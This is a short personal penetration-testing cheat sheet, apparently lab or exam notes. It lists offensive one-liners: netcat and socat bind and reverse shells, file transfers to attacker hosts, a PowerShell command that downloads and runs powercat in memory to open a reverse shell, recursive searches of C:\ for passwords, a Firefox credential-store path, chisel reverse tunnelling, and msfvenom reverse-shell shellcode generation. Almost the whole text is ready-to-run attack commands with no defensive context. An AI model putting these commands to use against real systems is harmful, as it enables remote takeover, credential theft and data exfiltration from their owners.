# RESOURCES
## buffer overflow
#### x86 cheat sheet
https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf



# COMMANDS
## netcat
#### file transfer
target machine
`nc -nlvp 9001 > incoming.exe`
local machine
`nc -nv IP.ADDR 9001 < EXAMPLE.exe`
(note: no output, must guess when upload complete)

#### bind shell
target
`nc -lnvp 9001 -e cmd.exe`
local
`nc -nv IP.ADDR 9001`

#### reverse shell
target
`nc -nv IP.ADDR 9001 -e /bin/bash`
local
`nc -lnvp 9001`

## socat
#### connecting
`socat - TCP4:10.11.0.22:110`

#### listener
host
`sudo socat TCP4-LISTEN:443 STDOUT`
local
`socat - TCP4:10.11.0.22:443`

#### file transfer
host
`sudo socat TCP4-LISTEN:443,fork file:EXAMPLE.txt`
local
`socat TCP4:10.11.0.4:443 file:EXAMPLE_NAME.txt,create`

#### reverse shell
local
`sudo socat -d -d TCP4-LISTEN:443 STDOUT`
target
`socat TCP4:10.11.0.22:443 EXEC:/bin/bash`

#### encrypted bind shells
create self-signed certificate
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
##windows
## one-liners
#### dir and file
list all files current dir
`get-childitem -hidden` 

search C:\ for password
`ci -recurse C:\ | % { select-string -path $_ -pattern password} 2>$null`

base64
`certutil -encone/-decode <FILE> <OUTFILE>`

copy contents of file to clipboard
`Get-Content <FILENAME> | Set-Clipboard`
#### network file transfers
smb setup on nix
`$ sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1`

create cred object
```
> $pass = convertto-securestring 'password1' -AsPlainText -Force`
> $cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
> New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.14.52\tools
cd dials:
```

download file
`(New-Object System.Net.Webclient).DownloadFile("http://<IP>:<PORT>/<FILENAME>.exe","C:\<FILENAME>.exe")`

download a file and execute from memory with powercat
`IEX(New-Object System.Net.Webclient).DownloadString('http://10.1.1.1:8000/powercat.ps1');powercat -c 10.1.1.1 -p 8001 -e powershell.exe`

### smb
localhost
`sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1

``` 
$pass = convertto-securestring 'password1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.14.52\tools
cd dials:
```

### credentials
```
C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db
```
sharpweb?
python cracker?

### file transfer



### chisel
\*nix local
`./chisel server --reverse -p 9001`

win remote
`./chisel.exe client <IP.ADDR>:9001 R:<PORT_TO_FWD>:LOCALHOST:<PORT_TO_FWD>`



### msfvenom
generate shellcode, filtering out bad characters
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`

